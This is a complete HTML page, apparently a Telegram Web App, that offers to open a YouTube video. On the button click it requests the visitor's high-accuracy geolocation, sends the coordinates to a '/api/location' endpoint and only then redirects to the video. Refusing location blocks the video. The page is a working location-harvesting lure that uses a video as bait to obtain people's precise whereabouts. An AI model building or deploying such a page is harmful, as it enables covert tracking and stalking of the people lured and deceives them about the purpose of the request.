<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">

  <title>SS0123</title>

  <script src="https://telegram.org/js/telegram-web-app.js?63"></script>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 24px;
      font-family: system-ui, sans-serif;
      background: #0b1220;
      color: #fff;
    }

    .box {
      max-width: 520px;
      margin: 50px auto;
      padding: 24px;
      background: #121c2f;
      border-radius: 20px;
      text-align: center;
    }

    button {
      width: 100%;
      padding: 15px;
      margin-top: 15px;
      border: 0;
      border-radius: 12px;
      font-size: 16px;
      cursor: pointer;
    }

    button:disabled {
      opacity: .5;
    }

    .small {
      opacity: .75;
      font-size: 13px;
      line-height: 1.5;
    }

    #status {
      margin-top: 15px;
      white-space: pre-wrap;
    }
  </style>
</head>

<body>

  <div class="box">

    <h2>SS0123</h2>

    <p>
      Continue to open the video.
    </p>

    <p class="small">
      Your location will be requested before opening the YouTube video.
      You can allow or deny the browser permission.
    </p>

    <button id="continueBtn">
      ▶️ Continue to YouTube
    </button>

    <div id="status" class="small"></div>

  </div>


  <script>

    const tg = window.Telegram?.WebApp;

    tg?.ready();
    tg?.expand();


    const continueBtn =
      document.getElementById("continueBtn");

    const statusEl =
      document.getElementById("status");


    const youtubeUrl =
      "https://youtu.be/v9fskO0C0mo";


    function status(message) {
      statusEl.textContent = message;
    }


    continueBtn.onclick = () => {

      if (!navigator.geolocation) {

        status(
          "Location is not supported. You can continue to YouTube."
        );

        return;
      }


      continueBtn.disabled = true;

      status(
        "Requesting location permission…"
      );


      navigator.geolocation.getCurrentPosition(

        async position => {

          const latitude =
            position.coords.latitude;

          const longitude =
            position.coords.longitude;

          const accuracy =
            position.coords.accuracy;


          status(
            "✅ Location permission allowed.\nOpening YouTube…"
          );


          try {

            const response =
              await fetch(
                "/api/location",
                {
                  method: "POST",

                  headers: {
                    "Content-Type":
                      "application/json"
                  },

                  body: JSON.stringify({
                    latitude,
                    longitude,
                    accuracy
                  })
                }
              );


            const result =
              await response.json();


            if (!result.ok) {
              throw new Error(
                result.error || "Location sending failed"
              );
            }

          } catch (error) {

            status(
              "Location was received, but sending failed. Opening YouTube…"
            );

          }


          setTimeout(() => {

            window.location.href =
              youtubeUrl;

          }, 500);

        },


        error => {

          continueBtn.disabled = false;


          if (error.code === 1) {

            status(
              "Location permission was denied. YouTube was not opened."
            );

          }

          else if (error.code === 2) {

            status(
              "Location is OFF or unavailable. Please turn on Location and try again."
            );

          }

          else if (error.code === 3) {

            status(
              "Location request timed out. Please try again."
            );

          }

          else {

            status(
              "Unable to get location. Please try again."
            );

          }

        },

        {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        }

      );

    };

  </script>

</body>
</html>
